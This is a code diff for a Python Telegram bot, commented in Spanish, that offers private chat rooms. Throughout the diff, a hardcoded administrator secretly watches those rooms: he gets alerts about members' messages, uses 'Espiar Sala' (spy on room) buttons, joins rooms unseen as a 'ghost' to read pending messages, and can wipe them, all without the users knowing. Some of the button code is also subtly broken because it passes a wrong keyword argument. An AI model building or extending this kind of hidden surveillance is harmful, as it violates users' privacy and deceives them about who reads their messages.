@@ -8,7 +8,7 @@ TOKEN = 'TU_TOKEN_AQUI'
 ADMIN_ID = 610413875 
 # ---------------------
 
-rooms = {}             # {"nombre": {"members": [ids], "pending": [mensajes]}}
+rooms = {}             
 user_to_room = {}      
 waiting_for_key = set()
 monitor_active = {}    
@@ -19,6 +19,7 @@ logging.basicConfig(level=logging.INFO)
 BTN_ENTRAR = '🔑 Entrar a Sala'
 BTN_SALIR = '🚪 Salir de la Sala'
 BTN_MONITOR = '📡 Monitor: ON/OFF'
+BTN_LIMPIAR_SALA = '🧹 Limpiar Sala' # Nuevo botón para el teclado físico
 
 async def delete_msg(context, chat_id, message_id, delay=0):
     if delay > 0: await asyncio.sleep(delay)
@@ -49,24 +50,24 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"📡 Monitor: {estado}")
         
         if is_now_active:
-            # 1. Mostrar salas creadas mientras el monitor estaba en OFF
+            # Mostrar salas creadas en OFF
             if offline_rooms_log:
                 reporte = "📂 **Salas creadas en OFF:**\n" + "\n".join([f"• `{r}`" for r in offline_rooms_log])
                 await context.bot.send_message(chat_id=ADMIN_ID, text=reporte)
                 offline_rooms_log.clear()
 
-            # 2. Funcionalidad Nueva: Listar salas con mensajes para limpieza manual
-            salas_con_mensajes = [name for name, data in rooms.items() if data["pending"]]
-            if salas_con_mensajes:
-                keyboard = []
-                for s in salas_con_mensajes:
-                    # Botón para entrar y botón para limpiar
-                    keyboard.append([
-                        InlineKeyboardButton(f"👁 Ver {s}", callback_query_data=f"view_{s}"),
-                        InlineKeyboardButton(f"🧹 Limpiar {s}", callback_query_data=f"clear_{s}")
-                    ])
-                reply_markup = InlineKeyboardMarkup(keyboard)
-                await update.message.reply_text("🛠 **Gestión de Salas Activas:**", reply_markup=reply_markup)
+            # Mostrar salas con mensajes pendientes
+            await mostrar_menu_gestion(update, context)
+        return
+
+    # --- BOTÓN LIMPIAR (Dentro de sala modo Fantasma) ---
+    if text == BTN_LIMPIAR_SALA and user_id == ADMIN_ID and monitor_active.get(user_id):
+        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
+        room_name = user_to_room.get(user_id)
+        if room_name in rooms:
+            rooms[room_name]["pending"] = []
+            msg = await update.message.reply_text(f"🧹 Sala `{room_name}` vaciada.")
+            asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
         return
 
     # --- BOTÓN SALIR ---
@@ -115,8 +116,13 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if user_id not in room["members"]: room["members"].append(user_id)
 
         user_to_room[user_id] = room_key
-        markup = ReplyKeyboardMarkup([[BTN_SALIR]], resize_keyboard=True, is_persistent=True)
-        await update.message.reply_text("😈 Fantasma" if is_ghost else "🔓 Conectado", reply_markup=markup)
+        
+        # Teclado dinámico: Si es fantasma, agregamos el botón de limpiar
+        kb_sala = [[BTN_SALIR]]
+        if is_ghost: kb_sala[0].append(BTN_LIMPIAR_SALA)
+        
+        markup = ReplyKeyboardMarkup(kb_sala, resize_keyboard=True, is_persistent=True)
+        await update.message.reply_text("👻 Fantasma" if is_ghost else "🔓 Conectado", reply_markup=markup)
 
         for item in list(room["pending"]):
             if is_ghost or item["sender"] != user_id:
@@ -126,25 +132,31 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id in user_to_room:
         await process_message(update, context)
 
-# --- MANEJADOR DE BOTONES INLINE (LIMPIEZA Y VISTA) ---
+async def mostrar_menu_gestion(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    salas_activas = [name for name, data in rooms.items() if data["pending"]]
+    if salas_activas:
+        keyboard = []
+        for s in salas_activas:
+            # Botones inline para facilitar el acceso rápido
+            keyboard.append([InlineKeyboardButton(f"👁 Espiar Sala: {s}", callback_query_data=f"view_{s}")])
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await context.bot.send_message(chat_id=ADMIN_ID, text="🛠 **Salas con actividad pendiente:**", reply_markup=reply_markup)
+    else:
+        await context.bot.send_message(chat_id=ADMIN_ID, text="✅ No hay mensajes acumulados en ninguna sala.")
+
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = query.from_user.id
     data = query.data
     await query.answer()
 
-    if data.startswith("clear_"):
-        room_name = data.replace("clear_", "")
-        if room_name in rooms:
-            rooms[room_name]["pending"] = [] # Vacía los mensajes pendientes
-            await query.edit_message_text(f"🧹 Sala `{room_name}` limpiada correctamente.")
-    
-    elif data.startswith("view_"):
+    if data.startswith("view_"):
         room_name = data.replace("view_", "")
-        # Forzar entrada como fantasma a esa sala
         user_to_room[user_id] = room_name
-        markup = ReplyKeyboardMarkup([[BTN_SALIR]], resize_keyboard=True, is_persistent=True)
-        await context.bot.send_message(chat_id=user_id, text=f"Entering {room_name}...", reply_markup=markup)
+        
+        # Al entrar por el botón, ya te damos el teclado con SALIR y LIMPIAR
+        markup = ReplyKeyboardMarkup([[BTN_SALIR, BTN_LIMPIAR_SALA]], resize_keyboard=True, is_persistent=True)
+        await context.bot.send_message(chat_id=user_id, text=f"🕵️ Entrando a `{room_name}`...", reply_markup=markup)
         
         room = rooms[room_name]
         for item in list(room["pending"]):
@@ -174,7 +186,6 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_message(chat_id=ADMIN_ID, text=msg_alert)
 
     others = [m for m in room["members"] if m != user_id]
-    
     if not others:
         room["pending"].append(content_item)
     else:
@@ -205,7 +216,7 @@ async def deliver_content(context, chat_id, item, room_name, is_ghost=False):
 if __name__ == '__main__':
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler('start', start))
-    app.add_handler(CallbackQueryHandler(button_callback)) # Maneja los botones de limpiar/ver
+    app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text))
     app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, process_message))
     app.run_polling()
